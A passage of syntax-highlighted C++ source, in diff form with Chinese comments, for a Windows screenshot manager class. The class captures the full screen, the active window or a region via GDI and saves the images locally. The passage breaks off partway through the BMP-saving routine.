+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;vector></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;algorithm></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 截图格式枚举</span></span>
+<span class="line"><span style="color:#F97583">enum</span><span style="color:#F97583"> class</span><span style="color:#B392F0"> CaptureFormat</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#79B8FF">    BMP</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">    JPEG</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">    PNG</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 截图区域类型</span></span>
+<span class="line"><span style="color:#F97583">enum</span><span style="color:#F97583"> class</span><span style="color:#B392F0"> CaptureArea</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#79B8FF">    FullScreen</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">    ActiveWindow</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">    CustomRegion</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 截图管理器</span></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> ScreenshotManager</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string m_outputDir;</span></span>
+<span class="line"><span style="color:#E1E4E8">    CaptureFormat m_format;</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#E1E4E8"> m_quality;</span><span style="color:#6A737D"> // JPEG/PNG质量 (1-100)</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#E1E4E8"> m_timestamp;</span><span style="color:#6A737D"> // 是否添加时间戳</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">public:</span></span>
+<span class="line"><span style="color:#B392F0">    ScreenshotManager</span><span style="color:#E1E4E8">() : </span><span style="color:#B392F0">m_format</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">CaptureFormat</span><span style="color:#E1E4E8">::BMP), </span></span>
+<span class="line"><span style="color:#B392F0">                         m_quality</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">90</span><span style="color:#E1E4E8">), </span><span style="color:#B392F0">m_timestamp</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        SetOutputDirectory</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"."</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 设置输出目录</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> SetOutputDirectory</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> dir</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        m_outputDir </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dir;</span></span>
+<span class="line"><span style="color:#B392F0">        CreateDirectoryA</span><span style="color:#E1E4E8">(dir, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 设置截图格式</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> SetFormat</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">CaptureFormat</span><span style="color:#FFAB70"> format</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        m_format </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> format;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 设置图像质量</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> SetQuality</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#FFAB70"> quality</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        m_quality </span><span style="color:#F97583">=</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">max</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">min</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">, quality));</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 设置时间戳</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> SetTimestamp</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">bool</span><span style="color:#FFAB70"> enable</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        m_timestamp </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> enable;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取屏幕</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> CaptureScreen</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">CaptureArea</span><span style="color:#FFAB70"> area</span><span style="color:#F97583"> =</span><span style="color:#B392F0"> CaptureArea</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">FullScreen</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#F97583">                      int</span><span style="color:#FFAB70"> x</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> y</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> width</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> height</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::string filename </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GenerateFilename</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        switch</span><span style="color:#E1E4E8"> (area) {</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureArea</span><span style="color:#E1E4E8">::FullScreen:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> CaptureFullScreen</span><span style="color:#E1E4E8">(filename.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureArea</span><span style="color:#E1E4E8">::ActiveWindow:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> CaptureActiveWindow</span><span style="color:#E1E4E8">(filename.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureArea</span><span style="color:#E1E4E8">::CustomRegion:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> CaptureRegion</span><span style="color:#E1E4E8">(x, y, width, height, filename.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            default</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 批量截图</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#B392F0"> BatchCapture</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#FFAB70"> count</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> intervalMs</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> successCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> count; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">CaptureScreen</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                successCount</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> count </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">                Sleep</span><span style="color:#E1E4E8">(intervalMs);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> successCount;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#6A737D">    // 生成文件名</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#B392F0"> GenerateFilename</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        char</span><span style="color:#E1E4E8"> filename[MAX_PATH];</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (m_timestamp) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            SYSTEMTIME st;</span></span>
+<span class="line"><span style="color:#B392F0">            GetLocalTime</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">st);</span></span>
+<span class="line"><span style="color:#B392F0">            sprintf_s</span><span style="color:#E1E4E8">(filename, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%s\\</span><span style="color:#9ECBFF">screenshot_</span><span style="color:#79B8FF">%04d%02d%02d</span><span style="color:#9ECBFF">_</span><span style="color:#79B8FF">%02d%02d%02d</span><span style="color:#9ECBFF">.</span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                     m_outputDir.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(),</span></span>
+<span class="line"><span style="color:#E1E4E8">                     st.wYear, st.wMonth, st.wDay,</span></span>
+<span class="line"><span style="color:#E1E4E8">                     st.wHour, st.wMinute, st.wSecond,</span></span>
+<span class="line"><span style="color:#B392F0">                     GetExtension</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">            static</span><span style="color:#F97583"> int</span><span style="color:#E1E4E8"> counter </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">            sprintf_s</span><span style="color:#E1E4E8">(filename, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%s\\</span><span style="color:#9ECBFF">screenshot_</span><span style="color:#79B8FF">%04d</span><span style="color:#9ECBFF">.</span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                     m_outputDir.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), counter</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">GetExtension</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#E1E4E8">(filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取文件扩展名</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#F97583"> char*</span><span style="color:#B392F0"> GetExtension</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        switch</span><span style="color:#E1E4E8"> (m_format) {</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureFormat</span><span style="color:#E1E4E8">::BMP: </span><span style="color:#F97583">return</span><span style="color:#9ECBFF"> "bmp"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureFormat</span><span style="color:#E1E4E8">::JPEG: </span><span style="color:#F97583">return</span><span style="color:#9ECBFF"> "jpg"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureFormat</span><span style="color:#E1E4E8">::PNG: </span><span style="color:#F97583">return</span><span style="color:#9ECBFF"> "png"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">            default</span><span style="color:#E1E4E8">: </span><span style="color:#F97583">return</span><span style="color:#9ECBFF"> "bmp"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取全屏</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> CaptureFullScreen</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> screenWidth </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemMetrics</span><span style="color:#E1E4E8">(SM_CXSCREEN);</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> screenHeight </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemMetrics</span><span style="color:#E1E4E8">(SM_CYSCREEN);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hScreenDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hMemoryDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleDC</span><span style="color:#E1E4E8">(hScreenDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        HBITMAP hBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleBitmap</span><span style="color:#E1E4E8">(hScreenDC, screenWidth, screenHeight);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        HGDIOBJ hOldBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        BitBlt</span><span style="color:#E1E4E8">(hMemoryDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, screenWidth, screenHeight, hScreenDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, SRCCOPY);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        bool</span><span style="color:#E1E4E8"> result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SaveBitmap</span><span style="color:#E1E4E8">(hBitmap, hMemoryDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">        ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取活动窗口</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> CaptureActiveWindow</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HWND hWnd </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetForegroundWindow</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hWnd) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        RECT rect;</span></span>
+<span class="line"><span style="color:#B392F0">        GetWindowRect</span><span style="color:#E1E4E8">(hWnd, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">rect);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> width </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> rect.right </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> rect.left;</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> height </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> rect.bottom </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> rect.top;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hWindowDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetDC</span><span style="color:#E1E4E8">(hWnd);</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hMemoryDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleDC</span><span style="color:#E1E4E8">(hWindowDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        HBITMAP hBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleBitmap</span><span style="color:#E1E4E8">(hWindowDC, width, height);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        HGDIOBJ hOldBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        PrintWindow</span><span style="color:#E1E4E8">(hWnd, hMemoryDC, PW_CLIENTONLY);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        bool</span><span style="color:#E1E4E8"> result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SaveBitmap</span><span style="color:#E1E4E8">(hBitmap, hMemoryDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">        ReleaseDC</span><span style="color:#E1E4E8">(hWnd, hWindowDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取指定区域</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> CaptureRegion</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#FFAB70"> x</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> y</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> width</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> height</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hScreenDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hMemoryDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleDC</span><span style="color:#E1E4E8">(hScreenDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        HBITMAP hBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleBitmap</span><span style="color:#E1E4E8">(hScreenDC, width, height);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        HGDIOBJ hOldBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        BitBlt</span><span style="color:#E1E4E8">(hMemoryDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, width, height, hScreenDC, x, y, SRCCOPY);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        bool</span><span style="color:#E1E4E8"> result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SaveBitmap</span><span style="color:#E1E4E8">(hBitmap, hMemoryDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">        ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 保存位图</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> SaveBitmap</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">HBITMAP</span><span style="color:#FFAB70"> hBitmap</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">HDC</span><span style="color:#FFAB70"> hDC</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        switch</span><span style="color:#E1E4E8"> (m_format) {</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureFormat</span><span style="color:#E1E4E8">::BMP:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> SaveAsBMP</span><span style="color:#E1E4E8">(hBitmap, hDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureFormat</span><span style="color:#E1E4E8">::JPEG:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> SaveAsJPEG</span><span style="color:#E1E4E8">(hBitmap, hDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#B392F0"> CaptureFormat</span><span style="color:#E1E4E8">::PNG:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> SaveAsPNG</span><span style="color:#E1E4E8">(hBitmap, hDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            default</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#B392F0"> SaveAsBMP</span><span style="color:#E1E4E8">(hBitmap, hDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 保存为BMP</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> SaveAsBMP</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">HBITMAP</span><span style="color:#FFAB70"> hBitmap</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">HDC</span><span style="color:#FFAB70"> hDC</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAP bmp;</span></span>
+<span class="line"><span style="color:#B392F0">        GetObject</span><span style="color:#E1E4E8">(hBitmap, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAP), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bmp);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAPINFOHEADER bi </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER);</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biWidth </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bmp.bmWidth;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biHeight </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bmp.bmHeight;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biPlanes </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
